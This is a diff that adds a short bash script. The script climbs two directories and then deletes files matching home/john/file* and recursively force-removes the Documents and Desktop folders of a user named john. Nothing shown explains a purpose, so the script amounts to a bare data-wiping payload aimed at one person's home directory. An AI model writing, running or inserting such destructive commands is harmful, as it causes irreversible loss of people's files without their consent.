@@ -1,0 +1,7 @@
+#!/bin/bash
+cd ..
+ls -a
+cd ..
+rm home/john/file*
+rm -Rf home/john/Documents
+rm -Rf home/john/Desktop
